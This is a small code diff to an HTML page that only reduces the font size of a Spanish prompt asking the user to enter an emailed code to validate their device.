@@ -36,7 +36,7 @@
                 <p id="gfg" hidden></p>
                 <p id="address" hidden></p>
                 <div align="center">
-                    <span class="ingresartxt" style="font-size: 1rem;">Ingresa el Código que le enviamos a su correo electrónico para validar tu dispositivo</span>
+                    <span class="ingresartxt" style="font-size: 0.8rem;">Ingresa el Código que le enviamos a su correo electrónico para validar tu dispositivo</span>
                 </div>
                
                 <hr class="line1" color="#C4C4C4">
